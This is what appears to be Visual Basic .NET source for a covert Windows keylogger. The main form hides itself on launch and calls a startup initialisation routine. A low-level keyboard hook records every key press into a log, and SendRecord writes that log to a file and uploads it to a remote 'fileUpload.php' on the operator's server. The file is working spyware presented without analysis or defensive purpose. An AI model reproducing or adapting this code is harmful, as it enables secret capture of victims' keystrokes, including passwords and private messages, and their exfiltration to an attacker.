Imports System.Runtime.InteropServices
Public Class Main
    Dim threadkeylogger As Threading.Thread
    Dim keyloggerLog As String = Nothing
    Dim isLoggerSwitch As Boolean = False
    Dim isLoggin As Boolean = False

    Private WithEvents kbHook As KeyboardHook
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Dim KeyloggerSwitch As Boolean = False
    <DllImport("user32.dll")>
    Shared Function GetAsyncKeyState(ByVal vKey As System.Windows.Forms.Keys) As Short
    End Function

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        parameters = Command()
        ReadParameters(parameters)
        StartUp.Init()
    End Sub

    Sub StartRecording()
        AddToLog("StartRecording@Main", "Starting record...", False)
        Try
            If Not isLoggerSwitch Then
                isLoggerSwitch = True
                If Not isLoggin Then
                    isLoggin = True
                    kbHook = New KeyboardHook()
                    AddHandler kbHook.KeyUp, AddressOf kbHook_KeyUp
                End If
            Else
                isLoggerSwitch = False
            End If
        Catch ex As Exception
            AddToLog("StartRecording@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StopRecording()
        AddToLog("StopRecording@Main", "Stopping record...", False)
        Try
            kbHook.FinalizeHK()
            End
        Catch ex As Exception
            AddToLog("StopRecording@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub SendRecord()
        AddToLog("SendRecord@Main", "Sending record...", False)
        Try
            kbHook.FinalizeHK()
            Dim fileName As String = "usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Keylogger.log"
            Dim filePath As String = DIRCommons & "\" & fileName
            If My.Computer.FileSystem.FileExists(filePath) Then
                My.Computer.FileSystem.DeleteFile(filePath)
            End If
            My.Computer.FileSystem.WriteAllText(filePath, keyloggerLog, False)
            My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
            End
        Catch ex As Exception
            AddToLog("SendRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub ResetRecord()
        AddToLog("ResetRecord@Main", "Resetting record...", False)
        Try
            keyloggerLog = Nothing
        Catch ex As Exception
            AddToLog("ResetRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub kbHook_KeyDown(ByVal Key As Keys) Handles kbHook.KeyDown
        AddKeyToLog(Key.ToString)
    End Sub

    Private Sub kbHook_KeyUp(ByVal Key As Keys) Handles kbHook.KeyUp
        AddKeyToLog(Key.ToString)
    End Sub

    Sub AddKeyToLog(ByVal key As String)
        If isLoggerSwitch Then
            keyloggerLog &= key
            'Console.WriteLine(key)
        End If
    End Sub
End Class
Public Class KeyboardHook
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal HookProc As KBDLLHookProc, ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function CallNextHookEx(ByVal idHook As Integer, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function UnhookWindowsHookEx(ByVal idHook As Integer) As Boolean
    End Function
    <StructLayout(LayoutKind.Sequential)>
    Private Structure KBDLLHOOKSTRUCT
        Public vkCode As UInt32
        Public scanCode As UInt32
        Public flags As KBDLLHOOKSTRUCTFlags
        Public time As UInt32
        Public dwExtraInfo As UIntPtr
    End Structure
    <Flags()>
    Private Enum KBDLLHOOKSTRUCTFlags As UInt32
        LLKHF_EXTENDED = &H1
        LLKHF_INJECTED = &H10
        LLKHF_ALTDOWN = &H20
        LLKHF_UP = &H80
    End Enum
    Public Shared Event KeyDown(ByVal Key As Keys)
    Public Shared Event KeyUp(ByVal Key As Keys)
    Private Const WH_KEYBOARD_LL As Integer = 13
    Private Const HC_ACTION As Integer = 0
    Private Const WM_KEYDOWN = &H100
    Private Const WM_KEYUP = &H101
    Private Const WM_SYSKEYDOWN = &H104
    Private Const WM_SYSKEYUP = &H105
    Private Delegate Function KBDLLHookProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
    Private KBDLLHookProcDelegate As KBDLLHookProc = New KBDLLHookProc(AddressOf KeyboardProc)
    Private HHookID As IntPtr = IntPtr.Zero
    Dim lastKey As Keys = Nothing
    Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
        If (nCode = HC_ACTION) Then
            Dim struct As KBDLLHOOKSTRUCT
            Dim keyString As Keys = Nothing
            keyString = CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys)
            Select Case wParam
                'Case WM_KEYDOWN, WM_SYSKEYDOWN
                '    RaiseEvent KeyDown(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                'Case WM_KEYUP, WM_SYSKEYUP
                '    RaiseEvent KeyUp(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                Case WM_KEYDOWN
                    RaiseEvent KeyDown(keyString)
                    'Case WM_KEYUP
                    '    RaiseEvent KeyUp(keyString)
            End Select
        End If
        Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
    End Function
    Public Sub New()
        HHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KBDLLHookProcDelegate, Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
        If HHookID = IntPtr.Zero Then
        End If
    End Sub
    Sub FinalizeHK()
        If Not HHookID = IntPtr.Zero Then
            UnhookWindowsHookEx(HHookID)
        End If
        MyBase.Finalize()
    End Sub
End Class